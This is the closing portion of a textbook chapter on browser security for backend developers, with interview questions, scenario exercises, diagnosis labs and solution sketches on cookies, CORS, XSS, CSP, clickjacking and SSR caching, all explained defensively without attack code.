| `HttpOnly` | Page scripts cannot read the cookie | That XSS cannot use the session from inside the page |
| `SameSite=Lax` | No cookie on cross-site `POST`, subresource or `fetch` requests | Protection between subdomains of one site; protection for state-changing `GET`s |
| Web Storage, IndexedDB | Isolation between origins | Protection from any script on the same origin; durability (users and browsers clear it) |
| Same-origin policy | Scripts cannot read other origins' responses, DOM or storage | That requests are not sent; any effect on non-browser clients; safety of scripts you include |
| CORS | A script reads a cross-origin response only if the server allows it; non-simple requests need a preflight | Any protection of the server; that simple requests do not execute |
| Output encoding | Data is displayed as text in its context | Safety if the wrong context's encoding is used, or an escape hatch is used |
| Strict nonce-based CSP | Scripts without the current nonce do not run, in supporting browsers | A fix for the injection; protection from a malicious script you load yourself |
| `frame-ancestors` / `X-Frame-Options` | Other sites cannot frame the page | Protection for responses that do not carry the header |
| SSG | Identical, cacheable public files for every user | That nothing personal or secret was baked in at build time |
| SSR | Content present in the HTML on arrival | That personalised HTML is safe to cache publicly; instant interactivity before hydration |

---

## Interview Drill

**Q1. What happens when you type a URL into the browser and press Enter?**
A strong answer must mention:
- Input handling (URL or search, default scheme), the HSTS check, and the browser process starting a navigation.
- DNS through the browser, OS and resolver caches; TCP handshake; TLS with SNI and ALPN, certificate validated for the name (each with its round trip).
- The HTTP request with the cookies that the rules allow; redirects repeating the request; the response's status and `Content-Type`.
- Commit to a renderer; streaming HTML parse into the DOM; the preload scanner; CSSOM; layout, paint, composite.
- Subresources and script API calls over the same connection; DOMContentLoaded and load.
*Common weak answer:* "DNS finds the IP and the server sends the page." It skips TCP, TLS, caching, cookies, redirects and rendering, which are most of the answer.

**Q2. How does the browser render a page? What blocks rendering, and what do `async` and `defer` do?**
A strong answer must mention:
- HTML → DOM and CSS → CSSOM; render tree; layout; paint; composite.
- CSS is render-blocking; a plain script is parser-blocking (and waits for preceding CSS).
- `async` downloads in parallel and runs on arrival, unordered; `defer` downloads in parallel and runs after parsing, in order; modules defer by default.
- Geometry changes trigger layout, colour changes paint, compositor-only properties skip both; repeated forced layouts thrash.
*Common weak answer:* "`async` and `defer` make scripts load faster." Both change *when* scripts run and whether parsing waits, which is the point.

**Q3. Where should a web application store an access token?**
A strong answer must mention:
- An `HttpOnly`, `Secure`, `SameSite` cookie: not readable by XSS, sent automatically, so CSRF must be handled (Chapter 19).
- `localStorage`: simple and not sent automatically, but readable and exfiltrable by any script on the origin.
- Memory only, with a short-lived access token refreshed through an `HttpOnly` cookie, as a middle ground.
- No choice survives XSS in the page; the choice limits what can be stolen and for how long, and preventing XSS matters most.
*Common weak answer:* "`localStorage`, because cookies are insecure." It ignores that XSS can copy the token out and use it anywhere.

**Q4. What do `Secure`, `HttpOnly` and `SameSite` do?**
A strong answer must mention:
- `Secure`: sent only over HTTPS.
- `HttpOnly`: invisible to page scripts, still sent with requests.
- `SameSite=Strict` never cross-site; `Lax` cross-site only on top-level safe navigations; `None` always (needs `Secure`; third-party cookie restrictions still apply).
- Cookies are ambient credentials; `SameSite` is the main browser-side defence against cross-site request forgery.
*Common weak answer:* "`HttpOnly` makes the cookie secure." It stops scripts reading it, nothing else.

**Q5. What is the same-origin policy? What does it restrict, and what does it not?**
A strong answer must mention:
- An origin is scheme, host and port; all three must match.
- It blocks reading other origins' responses from script, reaching into their frames' DOM, and reading their storage.
- It allows sending requests (forms, images, `fetch`), embedding resources and navigating, which is why CSRF exists.
- Scripts you embed run with your origin; `postMessage` is the controlled channel between origins.
*Common weak answer:* "It stops a page from sending requests to other sites." Sending is allowed; reading is what is blocked.

**Q6. How does CORS work? What is a preflight, and when is one sent?**
A strong answer must mention:
- The browser adds `Origin`; the server answers with `Access-Control-Allow-Origin`; the browser decides whether the script may read the response.
- Simple requests (`GET`/`HEAD`/`POST`, safelisted headers, form-like content types) are sent at once.
- Others get an `OPTIONS` preflight with `Access-Control-Request-Method` and `-Headers`; the server must allow them, and `Access-Control-Max-Age` caches the answer; otherwise the real request is not sent.
- Credentials need an exact origin (not `*`) and `Access-Control-Allow-Credentials: true`; `Vary: Origin` when the value varies.
*Common weak answer:* "CORS blocks requests from other domains." It governs reading in browsers; simple requests are still sent and executed.

**Q7. Why is CORS not a server-side access control?**
A strong answer must mention:
- It is enforced by the browser, for its users; `curl` and servers ignore it.
- Simple requests reach the server and run even if the CORS check fails.
- An allow header grants read access, it never restricts anyone.
- Real protection is authentication, authorisation and CSRF defence on the server.
*Common weak answer:* "We restrict CORS to our domain, so the API is safe." Anyone can still call it directly.

**Q8. What is XSS? How do you prevent stored, reflected and DOM-based XSS?**
A strong answer must mention:
- Attacker script runs in your page with your origin's powers: reading data, using the session, making requests as the user.
- Stored (saved content) and reflected (request data echoed back): contextual output encoding in server-rendered HTML, via auto-escaping templates.
- DOM-based (page script inserts untrusted data): safe sinks such as `textContent`, no `innerHTML`/`eval` with untrusted data, sanitisation for rich HTML, scheme checks on URLs.
- Defence in depth: a strict CSP, `HttpOnly` cookies, Trusted Types; validation helps but is not the defence.
*Common weak answer:* "Validate inputs and strip `<script>` tags." Blocklists miss event handlers and other contexts; output encoding is the defence.

**Q9. What does a Content Security Policy do?**
A strong answer must mention:
- A response header telling the browser which script (and other) sources may load and run.
- A strict policy uses a per-response random nonce (or hashes) with `'strict-dynamic'`, `object-src 'none'` and `base-uri 'none'`; injected scripts and inline handlers without the nonce do not run.
- `'unsafe-inline'` or broad domain allowlists weaken it; roll out with `Report-Only`.
- It is a safety net, not a fix for the injection; `frame-ancestors` also handles framing.
*Common weak answer:* "CSP prevents XSS." It blocks injected script from running; the injection bug remains and must be fixed.

**Q10. What is clickjacking, and how do you prevent it?**
A strong answer must mention:
- Your page is loaded in a disguised or invisible iframe so the user clicks your controls unknowingly, with their cookies.
- Prevent framing with `Content-Security-Policy: frame-ancestors 'none'` (or a list) and `X-Frame-Options: DENY` for older browsers.
- `SameSite` cookies make framed pages unauthenticated in cross-site frames.
- The header must be on every relevant response.
*Common weak answer:* "Use JavaScript to break out of frames." Script-based frame busting can be defeated; the header is the reliable control.

**Q11. What do SSR, CSR and SSG change for the backend?**
A strong answer must mention:
- CSR: a cacheable shell plus JSON APIs; first content after bundle and API calls; auth via cookies or bearer tokens on API calls, CORS if cross-origin.
- SSR: full HTML per request with data, rendering cost on the server, personalised HTML must be private, the session cookie arrives with the navigation.
- SSG/ISR: prebuilt public files on a CDN, no personal data in them, ISR refreshing like stale-while-revalidate.
- Choose per page by data and caching needs, and set headers to match.
*Common weak answer:* "SSR is better for SEO." True but incomplete: the caching, load and auth consequences are what the backend must design for.

**Q12. A front-end developer reports a "CORS error". How do you find out what is actually wrong?**
A strong answer must mention:
- Read the full console message: preflight or not, and which header or value failed.
- Find the request (often the `OPTIONS` row) in the network panel and its status: `401` from authentication, `404`/`405` for no route, `5xx` from a gateway without CORS headers, or a `200` missing headers.
- Reproduce with `curl` using the same `Origin` and preflight headers, outside the browser.
- Fix at the right layer: preflight before authentication, headers on error responses, allowlist matching, `Vary: Origin`; never "allow everything with credentials".
*Common weak answer:* "Add `Access-Control-Allow-Origin: *`." It may not even work (credentials), and it can open the API's responses to every site.

**Q13. What does `X-Content-Type-Options: nosniff` protect against?**
A strong answer must mention:
- Browsers once guessed a resource's type from its content.
- An uploaded file served as `image/png` that actually contains script could then be run as a script or stylesheet.
- `nosniff` makes the browser trust `Content-Type` and refuse mismatched script and style loads.
- Combined with serving user uploads from a separate domain and a correct `Content-Type`.
*Common weak answer:* "It stops XSS." It closes one route for content-type confusion, not XSS in general.

**Q14. Why are API subdomains the same site but not the same origin, and why does it matter?**
A strong answer must mention:
- Origin = scheme + host + port; site = scheme + registrable domain (one label below a public suffix).
- `app.example.com` and `api.example.com` are cross-origin (CORS applies) but same-site (`SameSite` cookies flow between them).
- A vulnerable subdomain can affect cookies scoped to the parent domain.
- Hence untrusted content goes on a different registrable domain.
*Common weak answer:* treating "origin" and "site" as synonyms, which makes the CORS and cookie behaviour impossible to explain.

---

## Scenario Exercises

1. A single-page app at `https://app.example.com` calls `https://api.example.com`. After adding an `Idempotency-Key` header to `POST /orders` (Chapter 13), every order submission fails in the browser with a CORS error, while `curl` works. Explain exactly what changed on the wire and the fix.
2. A team stores a long-lived refresh token in `localStorage` "because cookies are vulnerable to CSRF". A security review finds that the site loads seven third-party scripts. Explain the risk, and propose a storage design with its trade-offs.
3. Your API currently answers every request with `Access-Control-Allow-Origin` set to the request's `Origin` and `Access-Control-Allow-Credentials: true`. Describe what an attacker's website can do, and replace the configuration.
4. A support page renders `?message=` from the URL into the HTML so that agents can share pre-filled notes. Explain the vulnerability, write down the exact fix, and say which additional header would have limited the damage.
5. After moving the product pages from CSR to SSR behind the existing CDN, TTFB improves, but some logged-in users see "Hello, Priya" when they are not Priya. Explain and fix.
6. A banking site's "Confirm transfer" page can be loaded inside an `<iframe>` by any site. Describe the attack and two server-side defences.

---

## Diagnosis Lab

**Lab 1: "CORS error" on login, only in production**
- *Symptom:* The login form at `https://app.example.com` posts JSON to `https://api.example.com/v1/sessions`. In staging it works; in production the console shows `Access to fetch at 'https://api.example.com/v1/sessions' from origin 'https://app.example.com' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.`
- *Hypotheses:* (a) the production allowlist lacks `https://app.example.com`; (b) the preflight is rejected before the CORS handler runs; (c) a gateway in production answers the `OPTIONS` itself.
- *Evidence:* The network panel shows the `OPTIONS` request with status `403` and a response header `Server: api-gateway`. The real `POST` never appears. `curl -i -X OPTIONS` with the same `Origin` and request headers reproduces the `403` from the gateway, while the same `curl` against an application instance directly returns `204` with correct CORS headers. The production gateway has a web-application-firewall rule, absent in staging, that blocks `OPTIONS` requests without an `Authorization` header.
- *Root cause:* Preflights never carry credentials, so the gateway's rule rejected every preflight, and its `403` response had no CORS headers, so the browser reported a CORS failure.
- *Fix:* Exempt preflight requests (an `OPTIONS` with `Origin` and `Access-Control-Request-Method`) from the authentication rule and let them reach the CORS handler, or handle CORS at the gateway itself with the same allowlist; add CORS headers to the gateway's error responses so that real errors are visible.
- *Prevention:* Keep staging's edge configuration identical to production's; include a preflight check (`curl -X OPTIONS` with the real headers) in the deployment smoke tests.

**Lab 2: The checkout widget stopped working after the HTTPS migration**
- *Symptom:* After the site moved to HTTPS, the checkout page loads but its payment widget is missing; nothing has changed on the server, and the widget's provider reports no outage.
- *Hypotheses:* (a) the provider blocks the new origin; (b) the browser blocks the widget as mixed content; (c) the CSP blocks it.
- *Evidence:* The console shows `Mixed Content: The page at 'https://shop.example.com/checkout' was loaded over HTTPS, but requested an insecure resource 'http://widgets.payprovider.test/v2/widget.js'. This request has been blocked`. No CSP violation is reported. The URL comes from a configuration table filled years ago with absolute `http://` URLs.
- *Root cause:* An active resource (a script) referenced over HTTP from an HTTPS page; browsers block active mixed content.
- *Fix:* Change the configured URL to `https://` (the provider supports it). Search all configuration and stored content for absolute `http://` URLs.
- *Prevention:* Add `Content-Security-Policy: upgrade-insecure-requests` during migrations, use HTTPS or relative URLs in configuration, and run a mixed-content scan on key pages in the pipeline.

**Lab 3: Users logged out when the API moved to a subdomain**
- *Symptom:* The API moved from `https://shop.example.com/api` to `https://api.example.com`. The single-page app now gets `401` on every call, although users are logged in on the main site.
- *Hypotheses:* (a) the session cookie is not sent to the new host; (b) CORS blocks the responses; (c) the API no longer accepts the session.
- *Evidence:* In the network panel, requests to `api.example.com` carry no `Cookie` header, and the responses are `401` with correct CORS headers (so CORS is not the blocker). The Application panel shows the session cookie as `__Host-sid`, host-only for `shop.example.com`. The front-end code calls `fetch` without `credentials: "include"`.
- *Root cause:* Two independent reasons: the cookie, by design, belongs only to `shop.example.com`, and a cross-origin `fetch` does not send cookies by default.
- *Fix:* The simplest is to route `/api` on `shop.example.com` to the API through the reverse proxy (same origin: no CORS, no cookie changes). If a separate host is required: issue a cookie scoped deliberately for the API host (or the parent domain, understanding that every subdomain then receives it), call `fetch` with `credentials: "include"`, and answer with an exact `Access-Control-Allow-Origin` plus `Access-Control-Allow-Credentials: true`.
- *Prevention:* Treat any change of host for an API as an authentication change; review cookie scope, credentials mode and CORS together.

---

## Solution Sketches

1. A custom header is not CORS-safelisted, so the `POST` (already non-simple because of its JSON body) now needs a preflight that lists `idempotency-key` in `Access-Control-Request-Headers`. The API's preflight response does not include it in `Access-Control-Allow-Headers`, so the browser does not send the real request; `curl` ignores CORS, which is why it works. Fix: add `Idempotency-Key` (with `Content-Type` and `Authorization`) to the allowed headers in the API's CORS configuration.
2. Any script running on the origin, including all seven third-party scripts and anything an XSS bug injects, can read `localStorage` and send the refresh token to an attacker, who can then mint access tokens from anywhere for as long as the refresh token lives. Better: keep the refresh token in an `HttpOnly`, `Secure`, `SameSite=Strict` (or `Lax`) cookie scoped to the token endpoint, keep short-lived access tokens in memory, defend the cookie-carrying endpoints against CSRF (Chapter 19), and cut or isolate third-party scripts. Trade-offs: more moving parts, and XSS can still act inside a live page, but it can no longer steal long-lived credentials.
3. Any website can make a logged-in user's browser call your API with credentials, and because the server reflects that site's origin with `Allow-Credentials: true`, the attacking page can read the responses: profile data, orders, anything an authenticated `GET` returns. Replace with an exact allowlist (`https://app.example.com`, maybe staging origins), reflect `Origin` only when it is in the list, send `Vary: Origin`, allow credentials only if cookies are needed, and never allow `null`.
4. Reflected XSS: a link containing markup in `message` makes the page run attacker script as your origin for any agent who opens it. Fix: HTML-encode the parameter for the element-content context (or, better, insert it as text from script with `textContent`), and never insert it into a script, attribute or URL without that context's encoding. A strict nonce-based `Content-Security-Policy` would have stopped the injected script from running; `HttpOnly` session cookies would have kept the session cookie from being read.
5. The CDN is now storing personalised SSR HTML, which is served to other users; with CSR, the HTML was a generic shell and personal data came from private API responses. Fix: send `Cache-Control: private, no-store` on personalised SSR pages, configure the CDN to bypass caching for requests carrying the session cookie, purge the cached pages, and keep only non-personal pages cacheable (or render the personal part client-side).
6. An attacking page frames the confirmation page invisibly and places its own bait button under the user's pointer so that their click lands on "Confirm transfer", with their session cookie attached. Defences: `Content-Security-Policy: frame-ancestors 'none'` plus `X-Frame-Options: DENY` on the page, and `SameSite=Lax` or `Strict` session cookies so that a cross-site frame is not authenticated; a re-authentication or confirmation step for transfers adds a further barrier.

---

**END OF CHAPTER 9**
